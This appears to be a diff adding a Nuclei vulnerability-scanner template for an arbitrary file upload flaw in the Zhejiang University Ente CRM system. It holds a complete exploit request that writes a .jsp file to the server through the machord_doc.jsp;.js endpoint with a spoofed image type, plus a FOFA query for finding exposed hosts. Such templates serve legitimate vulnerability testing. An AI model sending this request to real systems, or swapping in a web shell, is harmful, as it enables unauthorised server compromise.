@@ -1,0 +1,59 @@
+id: enter-machord-doc-api-fileupload
+
+info:
+  name: 浙大恩特客户资源管理系统machord_doc.jsp;.js接口任意文件上传
+  author: YGnight
+  severity: high
+  description: description
+  reference:
+    - https://
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="浙大恩特客户资源管理系统"
+
+
+http:
+  - raw:
+      - |-
+        POST /entsoft_en/Storage/machord_doc.jsp;.js?formID=upload&machordernum=&fileName=night.jsp&strAffixStr=&oprfilenam=null&gesnum= HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0  uacq
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Content-Type: multipart/form-data; boundary=----4225820000370152680749129212
+        Content-Length: 548
+
+        ------4225820000370152680749129212
+        Content-Disposition: form-data; name="oprfilenam"
+
+        null
+        ------4225820000370152680749129212
+        Content-Disposition: form-data; name="uploadflg"
+
+        0
+        ------4225820000370152680749129212
+        Content-Disposition: form-data; name="strAffixStr"
+
+
+        ------4225820000370152680749129212
+        Content-Disposition: form-data; name="selfilenam"
+
+
+        ------4225820000370152680749129212
+        Content-Disposition: form-data; name="uploadfile"; filename="night.jsp"
+        Content-Type: image/png
+
+        night
+        ------4225820000370152680749129212--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - 'night.jsp'
